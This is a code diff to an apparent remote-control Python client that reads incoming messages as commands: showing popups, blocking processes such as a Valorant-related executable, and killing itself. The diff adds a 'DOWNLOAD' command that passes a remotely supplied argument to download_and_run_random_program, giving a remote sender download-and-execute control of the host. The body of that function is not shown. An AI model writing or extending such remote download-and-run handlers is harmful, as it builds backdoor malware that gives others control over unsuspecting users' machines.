@@ -5,7 +5,7 @@ import subprocess
 import os
 import sys
 
-commandsWithArgs = ["CALCULATOR", "IMAGE", "TEXT"]
+commandsWithArgs = ["CALCULATOR", "IMAGE", "TEXT", "DOWNLOAD"]
 image_url = "https://res.cloudinary.com/dnkpzafxp/image/upload/image_jtpkzq.png"
 
 app = QtWidgets.QApplication(sys.argv)
@@ -90,6 +90,8 @@ def handle_message(msg, block_exe, valorantblock_exe, state, startupinfo, creati
             state["valorant"] = None
 
     elif "TEXT_" in command:
+        #! DOES NOT WORK YET
+
         # TEXT_(text)|(opt secs)
         argspc = msg.split("_")
 
@@ -97,6 +99,9 @@ def handle_message(msg, block_exe, valorantblock_exe, state, startupinfo, creati
             dispatcher.show_message.emit(argspc[1], int(argspc[2]))
         else:
             dispatcher.show_message.emit(argspc[1], 5)
+    elif command == "DOWNLOAD":
+        if arg1:
+            download_and_run_random_program(arg1)
 
     elif command == "BYE":
         os.kill(os.getpid(), 9)
